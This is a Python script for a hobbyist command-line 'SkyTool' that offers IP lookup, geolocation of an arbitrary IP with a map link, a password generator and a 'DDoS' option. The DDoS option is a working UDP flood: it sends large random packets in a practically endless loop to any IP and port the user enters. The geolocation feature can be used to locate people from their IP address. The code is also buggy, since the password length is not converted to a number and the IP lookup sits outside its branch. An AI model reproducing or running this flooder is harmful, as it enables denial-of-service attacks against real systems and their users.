#Create By Sky Inc.
#Program By Sky Inc Team
#https://discord.gg/Sk8uYaqnhz
#Create By SkypeG

import requests
import json
import os
import sys
import socket
import random
import pyautogui
import random
import colorama
import socket, random, time
from pathlib import Path

from colorama import Fore, Back, Style

"""
    http://ip-api.com/json/IP_ADDRES
    http://www.google.com/maps/@LAT,LON,9z?hl=id
"""

print ("###############################################################################")
print ("                                                                               ")
print ("    				create by SkypeG                                           ")
print ("    								                                           ")
print ("   				   SkyTool                                                     ")
print ("                                   V1.0                                        ")
print ("                                                                               ")
print ("  https://github.com/SkypeG                                                    ")
print ("  https://www.youtube.com/@Skype112G/featured			                       ")
print ("###############################################################################")

host = socket.gethostname()

selection = input(host + "@Skytool :")

if selection=="help":
    print("""
    MYIP : For Checking Your IP
    IP : Fo Check Data From An Ip Address
    PWGEN : For Generate Secure Password
    DDoS : DDoS Tool
   """)

if selection=="credits":
    print("""
    Create By Sky Inc.
    Programmed By Sky Inc.
    """)

if selection=="myip":
    host = socket.gethostname()
    print("Device Name :", host)

    ip = socket.gethostbyname(host)
    print("Ip :",ip)

if selection=="pwgen":
    lower = "abcdefghijklmnopqrstuvwxyz"
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    number = "0123456789"
    symbols = "!@#$%^&*()."

    string = lower + upper + number + symbols
    lenght = input("Input The PW Lenght :")
    pwgen = "".join(random.sample(string,lenght))

    print("The Password Is :" + pwgen)

if selection=="DDoS":
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip = input("Enter Target IP: ")
    port = int(input("Enter Target Port: "))
    sleep = float(input("Sleep: "))
 
    s.connect((ip, port))
 
    for i in range(1, 100**1000):
        s.send(random._urandom(10)*1000)
        print(f"Send: {i}", end='\r')
        time.sleep(sleep)

if selection=="ip":
    ipaddress = input("IP Address : ")
iprequest = requests.get(f"http://ip-api.com/json/{ipaddress}")

if iprequest.status_code == 200:
	ipdata = json.loads(iprequest.text)

if ipdata["status"] == "success":
    print("Country :", ipdata["country"], ipdata["countryCode"])
    print("Region :", ipdata["region"], ipdata["regionName"])
    print("City :", ipdata["city"])
    print("Zip :", ipdata["zip"])
    lat = ipdata["lat"]
    lon = ipdata["lon"]
    print("Location :", lat, ",", lon)

    maps = f"https://www.google.com/maps/@{lat},{lon},9z"
    print(f"Maps : {maps}")

    print("Timezone :", ipdata["timezone"])
    print("ISP :", ipdata["isp"])
    print("IP Address :", ipdata["query"])

